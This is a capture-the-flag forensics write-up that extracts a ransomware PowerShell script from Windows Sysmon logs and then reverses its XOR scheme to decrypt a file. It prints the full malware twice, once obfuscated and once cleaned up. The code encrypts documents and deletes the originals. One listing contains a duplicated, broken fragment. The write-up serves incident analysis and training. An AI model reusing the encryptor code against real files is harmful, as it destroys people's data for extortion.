---
layout: load_md
title: The White Circle | Cyber Apocalypse 2025 | Cave Expedition Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2025
parent: cyber_apocalypse_2025
category: forensics
challenge: Cave Expedition
tags: ""
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2025</h1>


## Cave Expedition
> Solved by thewhiteh4t


- Multiple EVTX files i.e. windows event logs are provided, but it looks like the malware cleared all the logs but left one

```
    > ls -lah | grep -v 68K
    total 30M
    drwxr-xr-x 2 twh twh  44K Mar 27 12:19 .
    drwxr-xr-x 3 twh twh 4.0K Mar 27 12:19 ..
    -rw-r--r-- 1 twh twh 1.1M Jan 28 10:31 Microsoft-Windows-Sysmon_Operational.evtx
```

- I used `evtx_dump` to extract events from EVTX files and convert them into JSON for easier parsing

```
    > evtx_dump Microsoft-Windows-Sysmon_Operational.evtx -o jsonl -f sysmon.json
```

- Now we can write a parser and extract powershell code from the logs :

```
    import json
    
    with open('sysmon.json') as infile:
            data = infile.readlines()
    
    sequence = []
    
    for line in data:
            json_line = json.loads(line)
            try:
                    sequence.append(json_line\['Event'\]['EventData']['CommandLine'])
            except KeyError:
                    pass
    
    for cmdline in sequence:
            if 'wevtutil' in cmdline:
                    continue
            print(cmdline)
```

![](https://i.imgur.com/JU56fAW.png)

- As we can see `Append -NoNewline` is used so we will concatenate all the base64 strings

```
    > cat b64_ps.txt
    JGszNFZtID0gIktpNTBlSFFnS2k1a2IyTWdLaTVrYjJONElDb3VjR1JtIg0KJG03OFZvID0gIkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFFwWlQxVlNJRVpKVEVWVElFaEJWa1VnUWtWRlRpQkZUa05TV1ZCVVJVUWdRbGtnUVNCU1FVNVRUMDFYUVZKRkNpb2dWMmhoZENCb1lYQndaVzVsWkQ4S1RXOXpkQ0J2WmlCNWIzVnlJR1pwYkdWeklHRnlaU0J1YnlCc2IyNW5aWElnWVdOalpYTnphV0pzWlNCaVpXTmhkWE5sSUhSb1pYa2dhR0YyWlNCaVpXVnVJR1Z1WTNKNWNIUmxaQzRnUkc4Z2JtOTBJS
    ...
```

- After decoding in cyberchef we get the actual powershell script

```
    > cat attack.ps1
    $k34Vm = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
    $m78Vo = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
    $a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
    $b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"
    
    $e90Vg = @{}
    $f12Vh = @{}
    
    For ($x = 65; $x -le 90; $x++) {
        $e90Vg\[([char]$x)] = if($x -eq 90) { [char]65 } else { [char\]($x + 1) }
    }
    
    function n90Vp {
         [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m78Vo))
    }
    
    function l56Vn {
        return (a12Vc $k34Vm).Split(" ")
    }
    
    For ($x = 97; $x -le 122; $x++) {
        $e90Vg\[([char]$x)] = if($x -eq 122) { [char]97 } else { [char\]($x + 1) }
    }
    
    function a12Vc {
        param([string]$a34Vd)
        return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
    }
    
    $c56Ve = a12Vc $a53Va
    $d78Vf = a12Vc $b64Vb
    
    For ($x = 48; $x -le 57; $x++) {
        $e90Vg\[([char]$x)] = if($x -eq 57) { [char]48 } else { [char\]($x + 1) }
    }
    
    $e90Vg.GetEnumerator() | ForEach-Object {
        $f12Vh[$_.Value] = $_.Key
    }
    
    function l34Vn {
        param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
        $p12Vr = [byte[]]::new($m56Vo.Length)
        for ($x = 0; $x -lt $m56Vo.Length; $x++) {
            $q34Vs = $n78Vp[$x % $n78Vp.Length]
            $r56Vt = $o90Vq[$x % $o90Vq.Length]
            $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
        }
        return $p12Vr
    }
    
    function s78Vu {
        param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)
    
        if ($t90Vv -eq $null -or $t90Vv.Length -eq 0) {
            return $null
        }
    
        $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
        $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
        $a34Vc = l34Vn $t90Vv $y90Va $z12Vb
    
        return [Convert]::ToBase64String($a34Vc)
    }
    
    function o12Vq {
        param([switch]$p34Vr)
    
        try {
            if ($p34Vr) {
                foreach ($q56Vs in l56Vn) {
                    $d34Vp = "dca01aq2/"
                    if (Test-Path $d34Vp) {
                        Get-ChildItem -Path $d34Vp -Recurse -ErrorAction Stop |
                            Where-Object { $_.Extension -match "^\.$q56Vs$" } |
                            ForEach-Object {
                                $r78Vt = $_.FullName
                                if (Test-Path $r78Vt) {
                                    $s90Vu = [IO.File]::ReadAllBytes($r78Vt)
                                    $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
                                    [IO.File]::WriteAllText("$r78Vt.secured", $t12Vv)
                                    Remove-Item $r78Vt -Force
                                }
                            }
                    }
                r78Vt) {
                                    $s90Vu = [IO.File]::ReadAllBytes($r78Vt)
                                    $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
                                    [IO.File]::WriteAllText("$r78Vt.secured", $t12Vv)
                                    Remove-Item $r78Vt -Force
                                }
                            }
                    }
                }
            }
        }
        catch {}
    }
    
    if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
        o12Vq -p34Vr
        n90Vp
    }
```

- The code is obfuscated a bit so we can clear it up and get more meaningful script, for this step I used chatGPT 

```
    > cat attack_formatted.ps1
    # List of file extensions to target (Base64 encoded)
    $fileExtensions = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
    
    # Encoded warning message
    $encodedMessage = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
    
    # Encrypted keys (Base64 encoded)
    $key1 = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
    $key2 = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"
    
    # Dictionary for simple character shifting cipher
    $shiftCipher = @{}
    $reverseShiftCipher = @{}
    
    # Create a shift cipher for uppercase letters
    For ($ascii = 65; $ascii -le 90; $ascii++) {
        $shiftCipher\[([char]$ascii)] = if($ascii -eq 90) { [char]65 } else { [char\]($ascii + 1) }
    }
    
    # Function to decode the warning message from Base64
    function DecodeMessage {
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedMessage))
    }
    
    # Function to retrieve file extensions from Base64 encoding
    function GetFileExtensions {
        return (Base64Decode $fileExtensions).Split(" ")
    }
    
    # Extend the shift cipher to include lowercase letters
    For ($ascii = 97; $ascii -le 122; $ascii++) {
        $shiftCipher\[([char]$ascii)] = if($ascii -eq 122) { [char]97 } else { [char\]($ascii + 1) }
    }
    
    # Function to decode a Base64 string
    function Base64Decode {
        param([string]$encodedString)
        return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedString))
    }
    
    # Decode the keys from Base64
    $decodedKey1 = Base64Decode $key1
    $decodedKey2 = Base64Decode $key2
    
    # Extend the shift cipher to include numbers
    For ($ascii = 48; $ascii -le 57; $ascii++) {
        $shiftCipher\[([char]$ascii)] = if($ascii -eq 57) { [char]48 } else { [char\]($ascii + 1) }
    }
    
    # Reverse the shift cipher mapping
    $shiftCipher.GetEnumerator() | ForEach-Object {
        $reverseShiftCipher[$_.Value] = $_.Key
    }
    
    # Function to XOR encrypt/decrypt byte arrays
    function XORBytes {
        param([byte[]]$data, [byte[]]$keyA, [byte[]]$keyB)
        $result = [byte[]]::new($data.Length)
        for ($i = 0; $i -lt $data.Length; $i++) {
            $byteA = $keyA[$i % $keyA.Length]
            $byteB = $keyB[$i % $keyB.Length]
            $result[$i] = $data[$i] -bxor $byteA -bxor $byteB
        }
        return $result
    }
    
    # Function to encrypt a file's contents
    function EncryptFile {
        param([byte[]]$fileData, [string]$keyA, [string]$keyB)
    
        if ($fileData -eq $null -or $fileData.Length -eq 0) {
            return $null
        }
    
        $keyBytesA = [System.Text.Encoding]::UTF8.GetBytes($keyA)
        $keyBytesB = [System.Text.Encoding]::UTF8.GetBytes($keyB)
        $encryptedData = XORBytes $fileData $keyBytesA $keyBytesB
    
        return [Convert]::ToBase64String($encryptedData)
    }
    
    # Function to find and encrypt specific file types
    function SecureFiles {
        param([switch]$encrypt)
    
        try {
            if ($encrypt) {
                foreach ($ext in GetFileExtensions) {
                    $directory = "dca01aq2/"
                    if (Test-Path $directory) {
                        Get-ChildItem -Path $directory -Recurse -ErrorAction Stop |
                            Where-Object { $_.Extension -match "^\.$ext$" } |
                            ForEach-Object {
                                $filePath = $_.FullName
                                if (Test-Path $filePath) {
                                    $fileBytes = [IO.File]::ReadAllBytes($filePath)
                                    $encryptedContent = EncryptFile $fileBytes $decodedKey1 $decodedKey2
                                    [IO.File]::WriteAllText("$filePath.secured", $encryptedContent)
                                    Remove-Item $filePath -Force
                                }
                            }
                    }
                }
            }
        }
        catch {}
    }
    
    # Check if the script is running under a specific user and machine
    if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
        SecureFiles -encrypt
        DecodeMessage
    }
```   


- So now we can understand and see that its performing XOR among three values
- We can simply repurpose existing code to decrypt the PDF file, I added the following extra code in same ps1 script :

```
    > diff attack_formatted.ps1 decrypt.ps1
    81a82,96
    > function DecryptFile {
    >     param([byte[]]$fileData, [string]$keyA, [string]$keyB)
    >
    >     if ($fileData -eq $null -or $fileData.Length -eq 0) {
    >         return $null
    >     }
    >
    >     $keyBytesA = [System.Text.Encoding]::UTF8.GetBytes($keyA)
    >     $keyBytesB = [System.Text.Encoding]::UTF8.GetBytes($keyB)
    >     $decryptedData = XORBytes $fileData $keyBytesA $keyBytesB
    >     $byteArray = [byte[]] $decryptedData
    >     [IO.File]::WriteAllBytes("flag.pdf", $byteArray)
    > }
    >
    114a130,132
    > $fileText = [IO.File]::ReadAllText("map.pdf.secured")
    > $fileBytes = [System.Convert]::FromBase64String($fileText)
    > DecryptFile $fileBytes $decodedKey1 $decodedKey2
```

![](https://i.imgur.com/I2Toyzc.png)

